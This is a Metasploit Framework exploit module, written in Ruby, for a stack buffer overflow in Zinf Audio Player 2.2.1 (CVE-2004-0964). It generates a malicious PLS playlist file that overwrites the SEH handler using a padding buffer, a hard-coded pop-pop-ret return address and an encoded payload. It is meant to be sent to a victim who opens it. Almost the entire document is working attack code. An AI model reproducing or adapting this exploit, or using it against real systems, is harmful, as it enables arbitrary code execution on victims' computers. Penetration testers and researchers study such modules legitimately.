##
# $Id: zinfaudioplayer221_pls.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Zinf Audio Player 2.2.1 (PLS File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Zinf Audio Player 2.2.1.
				An attacker must send the file to victim and the victim must open the file.
				Alternatively it may be possible to execute code remotely via an embedded
				PLS file within a browser, when the PLS extention is registered to Zinf.
				This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancek <trancek[at]yashira.org>', 'patrick' ],
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2004-0964' ],
					[ 'OSVDB', '10416' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/7888' ],
					[ 'BID', '11248' ],
				],
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Tested by patrick - 20090429 xpsp3
					[ 'Zinf Universal 2.2.1', { 'Ret' => 0x1204f514 } ], #pop esi; pop ebx; ret - ./Plugins/zinf.ui
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sep 24 2004',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'exploit_zinf.pls']),
			], self.class)

	end

	def exploit
		seh = generate_seh_payload(target.ret)
		filepls = rand_text_alpha_upper(1424) + seh

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(filepls)

	end

end